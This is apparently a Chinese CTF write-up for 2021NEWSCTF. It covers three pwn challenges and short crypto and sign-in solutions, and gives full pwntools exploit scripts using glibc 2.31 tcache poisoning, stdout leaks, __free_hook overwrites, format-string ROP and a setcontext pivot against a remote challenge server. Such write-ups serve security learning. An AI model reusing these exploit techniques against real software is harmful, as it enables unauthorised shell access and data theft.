# 2021NEWSCTF



题思路基本都是最近见过的，正好学习了一下高版本的堆利用。第一个ak了pwn，还是被挤了下去，体验极差。
<!--more-->

# ntr_note
## checksec
```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '/home/ctfpwn/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/'
```
有UAF，但是没有show，还是要想办法泄露libc的地址。看到在dele和edit的时候都没有限制idx为负数的情况，所以一开始想直接编辑`stdout`的FIFE结构，但是怎么试都不成功。
所以利用double free和UAF，通过爆破半字节，申请`tcache`，然后再爆破半字节申请到`_IO_2_1_stdout_`，从而leak libc地址，然后改`free_hook`为system，通过`system('/bin/sh')`来get shell。
高版本og调栈没有用（恼
## exp
```python
from os import system
from pwn import *
from pwnlib.ui import pause
context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))

libc = ELF('./libc-2.31.so')

def add(size, data):
    p.sendlineafter('choice >>','1')
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.send(data)

def dele(idx):
    p.sendlineafter('choice >>','2')
    p.recvuntil('idx:')
    p.sendline(str(idx))

def edit(idx, data):
    p.sendlineafter('choice >>','4')
    p.recvuntil('idx:')
    p.sendline(str(idx))   
    p.recvuntil('content:')
    p.send(data)

count = 0
while True:
    try:
        log.success('{} attempt'.format(count))
        # p = process('./ntr_note',env={'LD_PRELOAD':'./libc-2.31.so'})

        p = remote('81.68.86.115', 10000)
        add(0x50, '/bin/sh\x00') # 0
        add(0x30,'/bin/sh\x00') # 1
        dele(0)
        edit(0,'a'*0x10)
        
        dele(0)
        edit(0,p16(0x3010))

        add(0x50, '/bin/sh\x00') # 2==0
        add(0x50, '\x00'*64+'\x00'*14+'\xff'*2) # 3 tcache
        log.success('tcache get!')
        dele(0)
        edit(0,'a'*0x10)
        dele(2)
        dele(3)

        edit(2,p16(0x3010))
        add(0x50,b'/bin/sh\x00') # 4
        # gdb.attach(p)
        edit(3,p16(0x36a0))
        add(0x50,'a'*0x20) # 5

        add(0x50,p64(0xfbad1800)+p64(0)*3+b'\x00') # 6

        libc_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
        libcbase = libc_addr - libc.sym['_IO_2_1_stdin_']
        leak('libcbase', libcbase)
        system = libcbase + libc.sym['system']
        free_hook = libcbase + libc.sym['__free_hook']
        log.success('libc addr get!')
        pause()
        edit(3,p64(0)*10)
        dele(1)
        edit(1,p64(free_hook)*3)
        edit(3,'\xff'*30)
        add(0x30, '/bin/sh\x00') # 7
        add(0x30, p64(system)) # 8
        dele(7)

        p.interactive()
    except:
        count = count+1
        p.close()
```
# 61happy
## checksec
```bash
    Arch:     amd64-64-littl
    RELRO:    Full RELRO
    Stack:    No canary foun
    NX:       NX enabled
    PIE:      PIE enabled
```
无限的格式化字符串，在栈上找栈链，并leak各段的基址。通过栈链，控制栈上一个指针指向返回地址，最后退出程序执行rop。
这个题我用og一个也没有成功，单纯的`pop rdi ret`还会覆盖我的栈链，所以选择了`pop rdi rbp ret`，从而跳过栈链，最后通过`system('/bin/sh')`来get shell。
## exp
```python
from pwn import *
# context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
# p = process('./qiandao',env={'LD_PRELOAD':'./libc-2.31.so'})
p = remote('81.68.86.115',10001)
libc = ELF('./libc-2.31.so')

def write(offset, gadget):
    # point to ret addr
    payload = '%{}c%9$hhn'.format(offset)
    p.send(payload.ljust(0x64,'\x00'))

    # overwrite 1 bytes
    payload= '%{}c%37$hhn'.format(gadget)
    p.send(payload.ljust(0x64,'\x00'))

payload = '||%p||%7$p||%9$p||' # text, libc, stack
p.sendline(payload)
p.recvuntil('||')
text_base = int(p.recvuntil('||',drop=True),16) - 0x914
libc_base = int(p.recvuntil('||',drop=True),16) - 243 - libc.sym['__libc_start_main'] 
stack_addr = int(p.recvuntil('||',drop=True),16)
ret_addr = stack_addr - 0xf0 
leak('text base', text_base)
leak('libc base', libc_base)
leak('ret_addr', ret_addr)

pop_rdi = libc_base + 0x276e9
system = libc_base + libc.sym['system']
binsh = libc_base + 0x1b75aa

offset = ret_addr&0xffff
print(hex(offset))
gadget = [
    pop_rdi&0xff,
    (pop_rdi>>8)&0xff,
    (pop_rdi>>16)&0xff,
    (pop_rdi>>24)&0xff,
    (pop_rdi>>32)&0xff
]
leak('pop rdi',pop_rdi)
string = [
    binsh &0xff,
    (binsh>>8)&0xff,
    (binsh>>16)&0xff,
    (binsh>>24)&0xff,
    (binsh>>32)&0xff
]
leak('bin sh',binsh)
func = [
    system&0xff,
    (system>>8)&0xff,
    (system>>16)&0xff,
    (system>>24)&0xff,
    (system>>32)&0xff,
    (system>>40)&0xff
]
leak('system',system)

# point to ret addr
payload = '%{}c%9$hn'.format(offset)
p.send(payload.ljust(0x64,'\x00'))

# overwrite 1 bytes
payload= '%{}c%37$hhn'.format(gadget[0])
p.send(payload.ljust(0x64,'\x00'))
offset = ret_addr&0xff

write(offset+1, gadget[1])

offset = offset + 8
write(offset, string[0])
write(offset+1, string[1])
write(offset+2, string[2])

offset = offset + 16
write(offset, func[0])
write(offset+1, func[1])
write(offset+2, func[2])
write(offset+3, func[3])
write(offset+4, func[4])
write(offset+5, func[5])

p.sendline('61happy'.ljust(0x64,'\x00'))

p.interactive()
```
# super_note
## checksec
```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '/home/ctfpwn/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/'
```
与第一题的劫持思路差不多，这次ntr师傅好心给了你堆地址的`low 2 bytes`（淦！）
这样我们就可以劫持`tcache`了，之后还是通过爆破半字节申请到`_IO_2_1_stdout_`，从而leak libc地址。然后，劫持`free_hook`为`puts_addr`，这样我们就可以泄露栈（environ）和堆的地址了。接着，劫持`tcache`的指针部分，配合劫持`free_hook`。我们可以任意地址读写。
这里我本来是想在栈上构造orw，然后`shutdown`来执行的，结果`main`根本没有`ret`指令（
所以还是要通过`setcontext`来进行栈迁移，先通过任意地址读写，在一段连续的空间写我们的orw。然后，再找一块空间用来进行`setcontext`的寄存器设置。在高版本的libc中`setcontext`的寄存器与rbx有关了，还有通过一个gadget来控制rdx的值
用ropper找
```bash
ropper -f ./libc-2.31.so --search 'mov rdx'
```
发现这样一个gadget
```bash
0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
```
把`free_hook`覆盖为这个gadget，可以通过rdi控制rdx，进而在`rdx + 0x20`的位置写`setcontext + 61`的地址就可以执行orw。
这里还要注意rcx的值会影响rsp。
## exp
```python
from os import write
from pwn import *
from pwnlib.ui import pause
context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#
# p = process('./super_note',env={'LD_PRELOAD':'./libc-2.31.so'})
p = remote('81.68.86.115', 10002)
libc = ELF('./libc-2.31.so')

def add(idx, size):
    p.sendlineafter('choice:','1')
    p.recvuntil('index:')
    p.sendline(str(idx)) 
    p.recvuntil('size:')
    p.sendline(str(size))

def edit(idx, data):
    p.sendlineafter('choice:','2')
    p.recvuntil('index:')
    p.sendline(str(idx))   
    p.recvuntil('content:')
    p.send(data)

def show(idx):
    p.sendlineafter('choice:','3')
    p.recvuntil('index:')
    p.sendline(str(idx))

def dele(idx):
    p.sendlineafter('choice:','4')
    p.recvuntil('index:')
    p.sendline(str(idx))

# double free
add(0,0x50) # 0
show(0)
p.recvuntil('address:[')
heap_base = int(p.recvuntil(']\n',drop=True),16) - 0x3a0 - 0x1000 - 0x560
tcache = heap_base + 0x10
leak('heap base',heap_base)

add(1,0x30) # 1
dele(0) # 0
edit(0,'a'*0x10)
dele(0) # 0-0
edit(0,p16(tcache)) # 0-tcache

add(0,0x50) # -tcache
add(2, 0x50) # tcache
edit(2,'\x00'*64+'\x00'*14+'\xff'*2)
log.success('tcache get!')


dele(0) # 0
edit(0,'a'*0x10)
dele(0) # 0-0
dele(2) # ub-tcache

edit(0,p16(tcache)) # 0-tcache
add(0, 0x50) # -tcache

edit(2,p16(0x26a0)) # -tcache-stdout
add(3, 0x50) # tcache
edit(3,'a'*0x20)
add(4, 0x50) # stdout
edit(4,p64(0xfbad1800)+p64(0)*3+b'\x00')

libc_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libcbase = libc_addr - libc.sym['_IO_2_1_stdin_']
leak('libcbase', libcbase)
puts_addr = libcbase + libc.sym['puts']
free_hook = libcbase + libc.sym['__free_hook']
# 0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
getkeyserv_handle = libcbase + 0x1547a0
open_addr = libcbase + libc.sym['open']
read_addr = libcbase + libc.sym['read']
write_addr = libcbase + libc.sym['write']
setcontext = libcbase + libc.sym['setcontext'] +61

pop_rdi = libcbase + 0x26b72
pop_rsi = libcbase + 0x27529
pop_rax = libcbase + 0x4a550
pop_rsp = libcbase + 0x32b5a
pop_rax_rdx_rbx = libcbase + 0x1626d5
syscall_ret = libcbase + 0x66229

log.success('libc addr get!')
edit(3,p64(0)*10) # tcache
dele(1) # 0x40->1
edit(1,p64(free_hook)) # 1->free_hook
edit(3,'\xff'*30)
add(1,0x30)
add(5,0x30) # free_hook
edit(5,p64(puts_addr))

dele(0)

heap_base = u64(p.recvuntil(b'\x0a',drop=True)[-6:].ljust(8,b'\x00')) - 0x10
leak('heap base',heap_base)

orw_part_1 = heap_base + 0x2000
orw_part_2 = orw_part_1 + 0x60
set_chunk = orw_part_2 + 0x60

edit(5,p64(0))

edit(5,p64(0))
add(6,0x60)
edit(3,p16(1)*10)
dele(6)
edit(6,p64(heap_base+0x90)) # tcache entry*
add(6,0x60)
add(6,0x60)
edit(6,p64(orw_part_1)*12)

edit(3,p16(7)*10)
add(8,0x60)
flag = orw_part_1 + 0x60 + 9*8
# open('./flag',0)
payload = p64(pop_rdi)+p64(666)+p64(pop_rdi) + p64(flag) + p64(pop_rax) + p64(2) + p64(syscall_ret)
# read(3, flag+8, 0x100)
payload+= p64(pop_rdi) + p64(3) +p64(pop_rsi)+p64(flag+8)+ p64(pop_rax_rdx_rbx) # + p64(0) +p64(heap_base) #+p64(heap_base)+p64(0) + p64(syscall_ret)
edit(8,payload)

edit(3,p16(7)*10)
edit(6,p64(orw_part_2)*12)
add(9,0x60)
payload = p64(0) +p64(0x100)+p64(0) + p64(syscall_ret)
# write(1,flag+8,0x100)
payload+= p64(pop_rdi) + p64(1) + p64(pop_rax) + p64(1) + p64(syscall_ret) + b'./flag\x00'
edit(9,payload)

edit(6,p64(set_chunk)*12)
add(10,0x60)
payload = p64(0) + p64(set_chunk) +p64(0)*2+ p64(setcontext)
edit(10,payload.ljust(0x60,'\x00'))

edit(6,p64(set_chunk+0x60)*12)
add(11,0x60)
payload = p64(0)*3 + p64(orw_part_1) + p64(80) + p64(88) + p64(0)+p64(0)+p64(orw_part_1+0x8) + p64(pop_rdi)
edit(11,payload.ljust(0x60,'\x00'))
# gdb.attach(p,'b *free')
edit(5,p64(getkeyserv_handle))
log.success('start aaattttack !!!!!!!!!!!')
dele(10)

# edit(3,p64(0)*10) # tcache
# dele(1) # 0x40->1
# edit(1,p64(env)) # 1->env
# edit(3,'\xff'*30)
# add(1,0x30)
# add(6,0x30) # env
# edit(5,p64(puts_addr))
# dele(6)

# stack_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x100
# rbp_addr = stack_addr -8
# leak('stack_addr', stack_addr)

# edit(3,p16(7)*10)
# add(8,0x60)
# flag = stack_addr + 0x60 + 7*8
# payload = p64(pop_rdi) + p64(flag) + p64(pop_rax) + p64(2) + p64(syscall_ret)
# payload+= p64(pop_rdi) + p64(3) + p64(pop_rax_rdx_rbx) + p64(0) +p64(heap_base)+p64(0) + p64(syscall_ret)
# edit(8,payload)

# edit(7,p64(stack_addr+0x60)*12)
# add(8,0x60)
# payload = p64(pop_rdi) + p64(1) + p64(pop_rax_rdx_rbx) + p64(1) +p64(heap_base)+p64(0) + p64(syscall_ret) + b'./flag\x00'
# edit(8,payload)

# p.shutdown()


p.interactive()
```
# 签到
%3D改成=，扔到cyberchef
# RAS256
```python
def RSA_File():
    public_name = input("请输入公钥文件名(没有直接回车)：")
    flag_name = input("请输入加密文件名：")
    private_name = input("请输入私钥文件名(没有直接回车)：")
    with open(flag_name, 'rb') as f:
        c = bytes_to_long(f.read())
    if private_name == "":
        pass
    else:
        with open(private_name, 'r') as private:
            Key = RSA.importKey(private.read())
            n, e, d, p, q = Key.n, Key.e, Key.d, Key.p, Key.q
            m = pow(c, d, n)
            print("明文：", libnum.n2s(m))
            return
    with open(public_name, 'r') as public:
        key = RSA.importKey(public.read())
        n, e = key.n, key.e

    print("n=", n)
    print("e=", e)
    print("c=", c)
```
解得
```python
n = 98432079271513130981267919056149161631892822707167177858831841699521774310891  
e = 65537  
c = 6793000449683458761243147198477390385097096925500467689087326832717298959098
c = 70099856477856647119324475779448956753505959373194081911451122574748717928011
c = 5077560311513279671817430508125151837396585328082180175253360345086848717946
```
256的n暴力分解，得到p，q
```python
p = 302825536744096741518546212761194311477
q = 325045504186436346209877301320131277983
```

```python
p = 302825536744096741518546212761194311477
q = 325045504186436346209877301320131277983
e = 65537 
c = int(input("c="))
phi = (p - 1) * (q - 1)
n = p * q
d = gmpy2.invert(e, phi)
m = pow(c, d, n)
#print("明文：", libnum.n2s(m))
string = long_to_bytes(m)
print(string)
```


